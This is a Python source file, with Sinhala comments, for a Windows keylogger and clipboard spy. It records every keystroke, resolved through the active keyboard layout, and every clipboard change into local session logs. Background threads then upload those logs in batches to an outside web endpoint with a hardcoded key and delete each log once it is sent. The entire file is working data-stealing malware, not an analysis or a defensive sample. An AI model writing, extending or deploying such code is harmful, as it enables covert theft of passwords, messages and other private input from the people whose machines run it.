import os
import time
import socket
from datetime import datetime
import threading
from pynput import keyboard
import pyperclip
import ctypes
import platform
import requests
import json

# ═══════════════════════════════════════════════════════
# CONFIGURATION (සැකසුම්)
# ═══════════════════════════════════════════════════════
VERCEL_API_URL  = "https://logger-backend-olive.vercel.app/api/sync"
SECRET_API_KEY  = "MySuperSecretToken123"
DEVICE_ID       = platform.node()
BASE_LOG_DIR    = "logs"
# ═══════════════════════════════════════════════════════

os.makedirs(BASE_LOG_DIR, exist_ok=True)

# වර්තමාන session — Timestamp-based unique ID
SESSION_ID       = int(time.time())
CURRENT_LOG_FILE = os.path.join(BASE_LOG_DIR, f"session_{SESSION_ID}.jsonl")

user32          = ctypes.windll.user32
text_buffer     = ""
last_special_key = ""
last_type_time  = time.time()


# ═══════════════════════════════════════════════════════
# INTERNET CONNECTIVITY CHECK
# Google DNS (8.8.8.8:53) ping — ලේසිම, හොඳම ක්‍රමය
# ═══════════════════════════════════════════════════════
def check_internet():
    try:
        socket.setdefaulttimeout(3)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("8.8.8.8", 53))
        s.close()
        return True
    except Exception:
        return False


# ═══════════════════════════════════════════════════════
# LOCAL FILE WRITER — සර්වර් සමග කිසිදු සම්බන්ධයක් නෑ
# ═══════════════════════════════════════════════════════
def write_to_session_file(log_type, payload):
    """වර්තමාන session ගොනුවට දේශීයව ලියයි. Upload නොකරයි."""
    if not payload.strip():
        return
    timestamp = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")
    entry = {
        "log_type": log_type,
        "payload": payload,
        "timestamp": timestamp
    }
    with open(CURRENT_LOG_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry, ensure_ascii=False) + "\n")


def flush_buffer():
    global text_buffer
    if text_buffer.strip():
        write_to_session_file("keylog", text_buffer)
        text_buffer = ""


# ═══════════════════════════════════════════════════════
# BATCH SYNC — පැරණි session ගොනු සර්වර් එකට BULK upload
# ═══════════════════════════════════════════════════════
def sync_old_files():
    """
    logs/ folder හි ඇති CURRENT session හැර
    සෙසු සියලු .jsonl ගොනු batch ලෙස සර්වර් එකට upload කරයි.
    Upload සාර්ථක නම් ගොනුව Delete කරයි.
    """
    headers = {
        "x-api-key": SECRET_API_KEY,
        "Content-Type": "application/json"
    }

    try:
        for filename in sorted(os.listdir(BASE_LOG_DIR)):
            if not filename.endswith(".jsonl"):
                continue

            file_path = os.path.join(BASE_LOG_DIR, filename)

            # ✅ IMPORTANT: වර්තමාන session file NEVER touch කරන්නේ නෑ!
            if file_path == CURRENT_LOG_FILE:
                continue

            # හිස් ගොනු delete
            if os.path.getsize(file_path) == 0:
                os.remove(file_path)
                continue

            # ගොනුවේ ඇති සියලු log entries කියවීම
            with open(file_path, "r", encoding="utf-8") as f:
                raw_lines = [l for l in f.readlines() if l.strip()]

            if not raw_lines:
                os.remove(file_path)
                continue

            # Session ID — filename: session_1720000000.jsonl → "1720000000"
            session_id_str = filename.replace("session_", "").replace(".jsonl", "")

            # Logs array build
            logs = []
            for line in raw_lines:
                try:
                    entry = json.loads(line.strip())
                    logs.append({
                        "log_type":  entry.get("log_type", "keylog"),
                        "payload":   entry.get("payload", ""),
                        "timestamp": entry.get("timestamp", "")
                    })
                except Exception:
                    continue

            if not logs:
                os.remove(file_path)
                continue

            # BATCH PAYLOAD — සියලු logs එකවර
            payload = {
                "device_id":  DEVICE_ID,
                "session_id": session_id_str,
                "logs":       logs
            }

            try:
                response = requests.post(
                    VERCEL_API_URL,
                    json=payload,
                    headers=headers,
                    timeout=30
                )
                if response.status_code == 200:
                    os.remove(file_path)  # ✅ Sync සාර්ථකයි → Delete
                # 200 නොවේ නම් ගොනුව ඉතිරි කරයි, ළඟදී නැවත උත්සාහ කරයි

            except Exception:
                pass  # Internet නෑ → ගොනුව ඉතිරිව, background watcher retry කරයි

    except Exception:
        pass


# ═══════════════════════════════════════════════════════
# STARTUP SYNC — Script ආරම්භ වූ සැනිටම
# ═══════════════════════════════════════════════════════
def startup_sync():
    """Script start වූ සැනිටම, internet ඇත්නම් පැරණි files sync කිරීම."""
    if check_internet():
        sync_old_files()


# ═══════════════════════════════════════════════════════
# BACKGROUND SYNC WATCHER — Internet ලැබුණු සැනිටම sync
# ═══════════════════════════════════════════════════════
def background_sync_watcher():
    """
    සෑම තත්පර 30 කට වරක් internet check කරයි.
    Internet ලැබුණු සැනිටම පැරණි files sync කිරීමට උත්සාහ කරයි.
    """
    while True:
        time.sleep(30)
        try:
            if check_internet():
                sync_old_files()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════
# KEYBOARD LAYOUT — Active layout character detection
# ═══════════════════════════════════════════════════════
def get_active_layout_char(key):
    try:
        vk = getattr(key, 'vk', None)
        if vk is None:
            return None
        hwnd        = user32.GetForegroundWindow()
        thread_id   = user32.GetWindowThreadProcessId(hwnd, None)
        layout      = user32.GetKeyboardLayout(thread_id)
        key_state   = (ctypes.c_byte * 256)()
        user32.GetKeyboardState(ctypes.byref(key_state))
        scan_code   = user32.MapVirtualKeyW(vk, 0)
        buf         = ctypes.create_unicode_buffer(5)
        res         = user32.ToUnicodeEx(vk, scan_code, ctypes.byref(key_state), buf, len(buf), 0, layout)
        if res > 0:
            return buf.value
    except Exception:
        pass
    return None


# ═══════════════════════════════════════════════════════
# KEYBOARD LISTENER
# ═══════════════════════════════════════════════════════
def on_press(key):
    global text_buffer, last_special_key, last_type_time
    last_type_time = time.time()

    actual_char = get_active_layout_char(key)
    if not actual_char and hasattr(key, 'char') and key.char is not None:
        actual_char = key.char

    if actual_char and actual_char.isprintable():
        text_buffer += actual_char
        last_special_key = ""
    else:
        if key == keyboard.Key.space:
            text_buffer += " "
            last_special_key = ""
        elif key == keyboard.Key.enter:
            text_buffer += " [ENTER]\n"
            flush_buffer()
            last_special_key = ""
        elif key == keyboard.Key.backspace:
            if len(text_buffer) > 0 and not text_buffer.endswith("] "):
                text_buffer = text_buffer[:-1]
            else:
                text_buffer += "[←]"
        else:
            key_name = str(key).replace('Key.', '').upper()
            if "'" not in key_name and not key_name.startswith('<'):
                clean_key_name = f" [{key_name}] "
                if clean_key_name != last_special_key:
                    text_buffer += clean_key_name
                    last_special_key = clean_key_name


# ═══════════════════════════════════════════════════════
# CLIPBOARD MONITOR
# ═══════════════════════════════════════════════════════
def monitor_clipboard():
    last_paste = ""
    while True:
        try:
            current_paste = pyperclip.paste()
            if current_paste != last_paste and current_paste.strip():
                last_paste = current_paste
                write_to_session_file("clipboard", current_paste)
        except Exception:
            pass
        time.sleep(2)


# ═══════════════════════════════════════════════════════
# LOCAL BUFFER MANAGER — රියල්-ටයිම් file flush
# ═══════════════════════════════════════════════════════
def local_storage_manager():
    global text_buffer, last_type_time
    while True:
        time.sleep(5)
        current_time = time.time()
        # 150+ chars හෝ 10s idle → flush to local file
        if len(text_buffer) >= 150 or (current_time - last_type_time > 10 and len(text_buffer) > 0):
            flush_buffer()


# ═══════════════════════════════════════════════════════
# MAIN — STARTUP SEQUENCE
# ═══════════════════════════════════════════════════════

# Step 1: ආරම්භ වූ සැනිටම, background thread හිදී old files sync
threading.Thread(target=startup_sync, daemon=True).start()

# Step 2: Clipboard + Buffer + Background sync watcher
threading.Thread(target=monitor_clipboard, daemon=True).start()
threading.Thread(target=local_storage_manager, daemon=True).start()
threading.Thread(target=background_sync_watcher, daemon=True).start()

# Step 3: Keyboard listener (main thread — script block කරයි)
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()